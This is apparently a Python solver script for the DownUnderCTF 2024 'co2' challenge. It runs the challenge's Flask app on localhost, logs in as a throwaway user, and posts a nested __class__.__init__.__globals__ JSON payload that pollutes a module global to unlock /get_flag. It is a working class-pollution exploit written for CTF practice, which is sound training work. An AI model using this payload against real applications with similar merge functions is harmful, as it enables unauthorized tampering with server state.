#!/usr/bin/env python3
"""Replay DownUnderCTF 2024 co2 as a local Python class-pollution proof.

This helper is for local or explicitly authorized CTF challenge artifacts. It
starts the provided Flask service, registers and logs in as a throwaway user,
then submits the nested `__class__.__init__.__globals__.flag` feedback payload
that flips the module-level flag guard used by `/get_flag`.
"""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request
from pathlib import Path
from uuid import uuid4


FLAG_RE = re.compile(r"(?i)(?:DUCTF|flag|ctf)\{[^{}\r\n]{3,300}\}")
PLACEHOLDER_MARKERS = ("TEST_FLAG", "FLAG_FOR_TESTING", "DUMMY", "PLACEHOLDER")


def build_pollution_payload() -> dict[str, object]:
    return {
        "title": "",
        "content": "",
        "rating": "",
        "referred": "",
        "__class__": {
            "__init__": {
                "__globals__": {
                    "flag": "true",
                },
            },
        },
    }


def build_login_form(username: str, password: str) -> bytes:
    return urllib.parse.urlencode({"username": username, "password": password}).encode()


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if any(marker in candidate.upper() for marker in PLACEHOLDER_MARKERS):
            continue
        if candidate not in flags:
            flags.append(candidate)
    return flags


def free_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def solve_src_dir(
    src_dir: Path,
    image: str = "forgeflag-co2-replay",
    timeout: float = 180.0,
    build: bool = True,
    runner: str = "local",
    venv_dir: Path | None = None,
) -> str:
    routes = src_dir / "app" / "routes.py"
    if not routes.exists():
        raise FileNotFoundError(f"missing source routes.py: {routes}")
    if runner == "local":
        transcript = solve_with_local_python(src_dir, timeout=timeout, venv_dir=venv_dir)
    elif runner == "docker":
        transcript = solve_with_docker(src_dir, image=image, timeout=timeout, build=build)
    else:
        raise ValueError(f"unsupported runner: {runner}")

    flags = extract_flags(transcript)
    if not flags:
        raise RuntimeError(f"no non-placeholder flag found in transcript: {transcript[-400:]!r}")
    print("challenge: co2")
    print("archive: co2.zip source handout")
    print("artifact: source routes.py")
    print("source_sink: merge(data, feedback) writes nested attributes")
    print("pollution_path: __class__.__init__.__globals__.flag")
    print("method: authenticated feedback JSON pollutes module global flag before /get_flag")
    print(f"flag: {flags[0]}")
    return flags[0]


def solve_with_docker(src_dir: Path, image: str, timeout: float, build: bool) -> str:
    docker = shutil.which("docker")
    if not docker:
        raise RuntimeError("docker is required to replay the local co2 service")
    if build:
        subprocess.run(
            [docker, "build", "-t", image, str(src_dir)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
            check=True,
        )

    name = f"forgeflag-co2-{uuid4().hex[:10]}"
    port = free_local_port()
    subprocess.run(
        [
            docker,
            "run",
            "--rm",
            "-d",
            "--name",
            name,
            "-p",
            f"127.0.0.1:{port}:1337",
            image,
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=True,
    )
    try:
        transcript = replay_http_flow(port, timeout=timeout)
    finally:
        subprocess.run([docker, "rm", "-f", name], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
    return transcript


def solve_with_local_python(src_dir: Path, timeout: float, venv_dir: Path | None) -> str:
    venv_dir = (venv_dir or Path(".forgeflag/replay-venvs/co2")).resolve()
    python = ensure_venv(src_dir, venv_dir, timeout=timeout)
    port = free_local_port()
    with tempfile.TemporaryDirectory(prefix="forgeflag-co2-") as tmp:
        workdir = Path(tmp) / "src"
        shutil.copytree(src_dir, workdir, ignore=shutil.ignore_patterns("__pycache__", "instance", "feedback", "*.db"))
        command = [
            str(python),
            "-c",
            (
                "from app import create_app; "
                "app=create_app(); "
                f"app.run(debug=False, host='127.0.0.1', port={port})"
            ),
        ]
        proc = subprocess.Popen(
            command,
            cwd=workdir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        try:
            return replay_http_flow(port, timeout=timeout)
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)


def ensure_venv(src_dir: Path, venv_dir: Path, timeout: float) -> Path:
    python = venv_dir / "bin" / "python"
    marker = venv_dir / ".forgeflag-co2-ready"
    requirements = src_dir / "requirements.txt"
    if marker.exists() and python.exists():
        return python
    venv_dir.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run([sys.executable, "-m", "venv", str(venv_dir)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout, check=True)
    pip = venv_dir / "bin" / "pip"
    subprocess.run(
        [str(pip), "install", "-r", str(requirements)],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=True,
    )
    marker.write_text("ready\n", encoding="utf-8")
    return python


def replay_http_flow(port: int, timeout: float) -> str:
    deadline = time.monotonic() + timeout
    base = f"http://127.0.0.1:{port}"
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    username = f"forgeflag_{uuid4().hex[:8]}"
    password = "forgeflag-pass"
    wait_for_service(opener, base, deadline)
    post_form(opener, f"{base}/register", build_login_form(username, password), deadline)
    post_form(opener, f"{base}/login", build_login_form(username, password), deadline)
    post_json(opener, f"{base}/save_feedback", build_pollution_payload(), deadline)
    return get_text(opener, f"{base}/get_flag", deadline)


def wait_for_service(opener: urllib.request.OpenerDirector, base: str, deadline: float) -> None:
    last_error: Exception | None = None
    while time.monotonic() < deadline:
        try:
            get_text(opener, f"{base}/", deadline)
            return
        except Exception as exc:
            last_error = exc
            time.sleep(0.5)
    raise TimeoutError(f"co2 service did not become ready: {last_error}")


def post_form(opener: urllib.request.OpenerDirector, url: str, body: bytes, deadline: float) -> str:
    request = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    return open_text(opener, request, deadline)


def post_json(opener: urllib.request.OpenerDirector, url: str, payload: dict[str, object], deadline: float) -> str:
    request = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    return open_text(opener, request, deadline)


def get_text(opener: urllib.request.OpenerDirector, url: str, deadline: float) -> str:
    return open_text(opener, urllib.request.Request(url), deadline)


def open_text(opener: urllib.request.OpenerDirector, request: urllib.request.Request, deadline: float) -> str:
    remaining = max(1.0, min(5.0, deadline - time.monotonic()))
    with opener.open(request, timeout=remaining) as response:
        return response.read().decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay DUCTF co2 from local CTF source artifacts.")
    parser.add_argument("--src-dir", type=Path, required=True, help="directory containing run.py and app/routes.py")
    parser.add_argument("--image", default="forgeflag-co2-replay", help="local Docker image tag to build/run")
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--runner", choices=("local", "docker"), default="local")
    parser.add_argument("--venv-dir", type=Path, help="persistent Python venv for local replay dependencies")
    parser.add_argument("--no-build", action="store_true", help="reuse an existing local image")
    args = parser.parse_args()
    try:
        solve_src_dir(
            args.src_dir.resolve(),
            image=args.image,
            timeout=args.timeout,
            build=not args.no_build,
            runner=args.runner,
            venv_dir=args.venv_dir,
        )
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
